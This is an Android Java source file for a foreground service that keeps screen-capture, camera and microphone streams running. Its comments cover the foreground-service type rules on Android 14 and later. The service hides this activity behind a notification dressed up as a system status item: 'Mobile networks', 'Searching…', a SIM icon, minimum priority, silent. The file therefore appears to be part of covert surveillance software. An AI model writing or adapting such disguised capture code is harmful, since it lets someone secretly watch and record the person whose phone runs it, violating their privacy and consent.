package com.gls.sim1;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import androidx.core.app.NotificationCompat;

/**
 * Foreground host for the media streams. Android 14+ (targetSdk 34+) validates
 * the foreground-service TYPE at startForeground(): a mediaProjection-typed FGS
 * is rejected unless a screen-capture projection is actually held. The old code
 * always asked for mediaProjection|microphone|camera, so opening the CAMERA
 * threw SecurityException and killed the process. The type is now chosen per
 * stream, with a specialUse fallback so a bad type can never crash the app.
 */
public class StreamService extends Service {
    private static volatile StreamService INSTANCE;
    private static volatile boolean READY = false;
    private static volatile int REQ_KIND = 0;
    private static final Handler WATCH = new Handler(Looper.getMainLooper());

    public static final int KIND_PROJECTION = 1;
    public static final int KIND_CAMERA = 2;
    public static final int KIND_MIC = 3;

    // Bitmask of the FGS types every *currently requested* stream needs. The
    // type must be the union, not just the newest kind: on Android 14+ dropping
    // mediaProjection while a projection is live (or starting a camera-only type
    // over an active projection) makes the platform revoke/kill the stream.
    private static final java.util.concurrent.atomic.AtomicInteger TYPES =
            new java.util.concurrent.atomic.AtomicInteger();

    public static void requestStart(Context ctx, int kind) {
        REQ_KIND = kind;
        int bit = typeBit(kind);
        if (bit != 0) TYPES.updateAndGet(t -> t | bit);
        StreamService s = INSTANCE;
        if (s != null) {
            s.promote();
            return;
        }
        Context app = ctx.getApplicationContext();
        Intent i = new Intent(app, StreamService.class);
        try {
            if (Build.VERSION.SDK_INT >= 26) app.startForegroundService(i);
            else app.startService(i);
        } catch (Exception ignored) {
        }
    }

    /** Called when a single stream stops so its type can be dropped again. */
    public static void requestRelease(int kind) {
        int bit = typeBit(kind);
        if (bit != 0) TYPES.updateAndGet(t -> t & ~bit);
        StreamService s = INSTANCE;
        if (s != null && TYPES.get() != 0) s.promote();
    }

    public static boolean awaitForeground(long ms) {
        long deadline = System.currentTimeMillis() + ms;
        while (!READY && System.currentTimeMillis() < deadline) {
            try {
                Thread.sleep(40);
            } catch (InterruptedException e) {
                break;
            }
        }
        return READY;
    }

    public static void requestStop(Context ctx) {
        StreamService s = INSTANCE;
        if (s == null) return;
        s.stopSelf();
    }

    private static int typeBit(int kind) {
        if (Build.VERSION.SDK_INT < 29) return 0;
        switch (kind) {
            case KIND_CAMERA:
                return Build.VERSION.SDK_INT >= 30 ? ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA : 0;
            case KIND_MIC:
                return Build.VERSION.SDK_INT >= 30 ? ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE : 0;
            case KIND_PROJECTION:
                return ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;
            default:
                return 0;
        }
    }

    private static int currentTypes() {
        int t = TYPES.get();
        if (t == 0) t = typeBit(REQ_KIND);
        return t;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        INSTANCE = this;
        createChannel();
        Notification n = buildNotification();
        READY = startTyped(n, currentTypes());
        scheduleWatch();
    }

    private void promote() {
        startTyped(buildNotification(), currentTypes());
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, "s1")
                .setContentTitle("Mobile networks")
                .setContentText("Searching…")
                .setSmallIcon(R.drawable.ic_sim1)
                .setOngoing(true)
                .setShowWhen(false)
                .setSilent(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
    }

    private boolean startTyped(Notification n, int types) {
        if (Build.VERSION.SDK_INT < 29 || types == 0) {
            try {
                startForeground(2, n);
                return true;
            } catch (Exception e) {
                android.util.Log.e("SIM1", "plain FGS rejected: " + e.getMessage());
                return false;
            }
        }
        try {
            startForeground(2, n, types);
            return true;
        } catch (Exception e) {
            android.util.Log.e("SIM1", "FGS type 0x" + Integer.toHexString(types)
                    + " rejected: " + e.getMessage());
        }
        if (Build.VERSION.SDK_INT >= 34) {
            try {
                startForeground(2, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
                return true;
            } catch (Exception e) {
                android.util.Log.e("SIM1", "specialUse FGS rejected: " + e.getMessage());
            }
        }
        try {
            startForeground(2, n);
            return true;
        } catch (Exception e) {
            android.util.Log.e("SIM1", "plain FGS rejected: " + e.getMessage());
            return false;
        }
    }

    private void scheduleWatch() {
        WATCH.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (INSTANCE == null) return;
                if (!ScreenStreamer.getInstance().anyActive()) {
                    stopSelf();
                    return;
                }
                scheduleWatch();
            }
        }, 3000);
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm.getNotificationChannel("s1") == null) {
                NotificationChannel ch = new NotificationChannel("s1", "Mobile networks", NotificationManager.IMPORTANCE_MIN);
                ch.setShowBadge(false);
                nm.createNotificationChannel(ch);
            }
        }
    }

    @Override
    public void onDestroy() {
        INSTANCE = null;
        READY = false;
        ScreenStreamer.getInstance().shutdownAll();
        TYPES.set(0);
        super.onDestroy();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
